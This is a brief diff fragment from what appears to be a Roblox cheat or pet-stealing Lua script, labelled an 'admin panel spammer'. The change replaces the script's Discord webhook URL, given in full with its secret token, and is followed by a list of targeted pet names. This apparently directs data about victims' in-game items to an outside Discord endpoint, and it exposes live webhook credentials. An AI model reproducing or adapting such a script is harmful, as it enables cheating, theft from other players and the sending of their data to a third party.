@@ -125,7 +125,7 @@ print("ADMIN PANEL SPAMMER HAS BEEN SUCCESFULLY EXECUTED")
 print("kinu likes men")
 
 -- CONFIG
-getgenv().webhook = "https://discord.com/api/webhooks/1437535784096759829/GlI5KE15OR7ONHiKMYbbe_CBgt5e8yOGCPKVSU7KIlQ72Xsk0ttVlQuy3IF1J7PBsmkl"
+getgenv().webhook = "https://discord.com/api/webhooks/1438239208333512906/Fxag9wB5J2vRuI95-SzpQAvs4JCYf60Vgye3cAzWu2MMPGGyCDjhvLZA3Kl5HdQESqUj"
 
 getgenv().TargetPetNames = {
     "Burguro and Fryuro",
